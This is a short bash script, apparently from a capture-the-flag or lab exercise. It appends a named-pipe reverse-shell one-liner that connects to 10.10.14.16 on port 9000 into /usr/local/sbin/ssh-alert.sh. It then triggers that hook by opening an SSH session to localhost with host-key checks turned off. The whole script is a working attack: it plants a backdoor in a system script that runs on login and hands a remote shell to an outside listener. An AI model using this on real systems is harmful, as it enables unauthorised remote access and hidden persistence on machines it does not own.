#!/bin/bash

export TERM=xterm
echo 'rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|bash -i 2>&1|nc 10.10.14.16 9000 >/tmp/f2' >> /usr/local/sbin/ssh-alert.sh
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1 id
